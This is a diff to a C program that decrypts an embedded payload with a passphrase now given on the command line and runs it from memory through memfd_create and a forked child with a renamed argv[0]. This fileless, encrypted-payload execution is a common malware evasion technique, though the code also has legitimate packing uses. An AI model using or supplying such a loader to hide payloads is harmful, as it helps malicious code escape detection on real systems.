@@ -1,68 +1,26 @@
-#define _GNU_SOURCE      // For syscall(), fexecve(), and possibly MFD_CLOEXEC
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
-#include <sys/syscall.h> // For SYS_memfd_create and syscall()
+#include <sys/syscall.h> // For syscall and SYS_memfd_create
 #include <sys/wait.h>
+#include <string.h>
 #include <errno.h>
-#include <string.h> // For strlen, strerror
 
-// Try to include sys/memfd.h, and set a flag if successful
-#if __has_include(<sys/memfd.h>)
-#include <sys/memfd.h>
-#define HAVE_SYS_MEMFD_H 1
-#else
-#define HAVE_SYS_MEMFD_H 0
-#endif
+#include "payload.h"
 
-// Manually define MFD_CLOEXEC if not found (it's usually in sys/memfd.h)
+// Define MFD_CLOEXEC if not already defined (e.g., by <sys/memfd.h>)
 #ifndef MFD_CLOEXEC
 #define MFD_CLOEXEC 0x0001U
 #endif
 
-// Manually define SYS_memfd_create if not found from sys/syscall.h
-#ifndef SYS_memfd_create
-#ifdef __x86_64__
-#define SYS_memfd_create 319
-#elif defined(__aarch64__)
-#define SYS_memfd_create 279
-#elif defined(__arm__) && defined(__thumb__) && __ARM_ARCH == 7 // for ARM EABI like Raspberry Pi
-#define SYS_memfd_create (__NR_SYSCALL_BASE + 385)
-#elif defined(__arm__)
-#define SYS_memfd_create 385
-#else
-#warning "SYS_memfd_create syscall number not defined for this architecture. Compilation might succeed but memfd creation will likely fail."
-#endif
-#endif
-
-#include "payload.h"
-
 static inline int create_memory_fd(const char *name, unsigned int flags) {
-    int fd = -1;
-#if HAVE_SYS_MEMFD_H && defined(__GLIBC__) && (__GLIBC__ > 2 || (__GLIBC__ == 2 && __GLIBC_MINOR__ >= 27))
-    fd = memfd_create(name, flags);
-    if (fd != -1) {
-        return fd;
+    int fd = syscall(SYS_memfd_create, name, flags);
+    if (fd == -1) {
+        perror("memfd_create (via syscall) failed");
     }
-#endif
-
-#ifdef SYS_memfd_create
-    fd = syscall(SYS_memfd_create, name, flags);
-    if (fd != -1) {
-        return fd;
-    }
-    // perror("syscall(SYS_memfd_create) failed"); // uncomment for debug
-    return -1;
-#else
-    fprintf(stderr, "Error: SYS_memfd_create syscall number is not defined for this architecture.\n");
-#if !(HAVE_SYS_MEMFD_H && defined(__GLIBC__) && (__GLIBC__ > 2 || (__GLIBC__ == 2 && __GLIBC_MINOR__ >= 27)))
-    fprintf(stderr, "       And <sys/memfd.h> was not available or memfd_create() function call failed.\n");
-#endif
-    errno = ENOSYS;
-    return -1;
-#endif
+    return fd;
 }
-
 
 void decrypt_data(unsigned char *data, size_t data_len, const char *passphrase);
 
@@ -70,7 +28,13 @@ int main(int argc, char *argv_main[]) {
     int fd;
     ssize_t n_written;
     pid_t pid;
-    const char *decryption_key_string = "wiktor";
+    const char *decryption_key_string;
+
+    if (argc < 2) {
+        fprintf(stderr, "Usage: %s <decryption_key> [payload_args...]\n", argv_main[0]);
+        return EXIT_FAILURE;
+    }
+    decryption_key_string = argv_main[1];
 
     if (enc_payload_len == 0) {
         fprintf(stderr, "Error: payload_len is 0. Is payload.h correctly generated and included?\n");
@@ -89,22 +53,16 @@ int main(int argc, char *argv_main[]) {
 
     fd = create_memory_fd("my_ram_exe", MFD_CLOEXEC);
     if (fd == -1) {
-        perror("create_memory_fd (memfd_create or syscall) failed");
         free(decrypted_data);
         return EXIT_FAILURE;
     }
 
-    // Write the decrypted data (from the copy) to memfd
+    // Write the decrypted data to memfd
     n_written = write(fd, decrypted_data, enc_payload_len);
-    free(decrypted_data); // Free the copy now
+    free(decrypted_data);
 
-    if (n_written == -1) {
-        perror("write to memfd failed");
-        close(fd);
-        return EXIT_FAILURE;
-    }
-    if (n_written != (ssize_t)enc_payload_len) {
-        fprintf(stderr, "Partial write to memfd: %zd of %u bytes\n", n_written, enc_payload_len);
+    if (n_written == -1 || n_written != (ssize_t)enc_payload_len) {
+        perror("write to memfd failed or partial write");
         close(fd);
         return EXIT_FAILURE;
     }
@@ -117,7 +75,11 @@ int main(int argc, char *argv_main[]) {
     }
 
     if (pid == 0) { // Child process
-        char **child_argv = malloc((argc + 1) * sizeof(char*));
+        // Adjust argc for the child: it's the original argc minus 1 (for the key)
+        // plus 1 (for the new argv[0]) minus 1 (for the program name itself).
+        // So, effectively, original argc - 1.
+        int child_argc = argc - 1;
+        char **child_argv = malloc((child_argc + 1) * sizeof(char *));
         if (!child_argv) {
             perror("malloc for child_argv failed");
             close(fd);
@@ -125,10 +87,11 @@ int main(int argc, char *argv_main[]) {
         }
 
         child_argv[0] = "(elf_from_mem)";
-        for (int i = 1; i < argc; i++) {
-            child_argv[i] = argv_main[i];
+        // Pass remaining arguments (argv_main[2] onwards) to the child
+        for (int i = 0; i < child_argc -1; i++) {
+            child_argv[i + 1] = argv_main[i + 2];
         }
-        child_argv[argc] = NULL;
+        child_argv[child_argc] = NULL;
 
         char *child_envp[] = {"CUSTOM_VAR=SetByParentRunner", "PATH=/usr/bin:/bin", NULL};
 
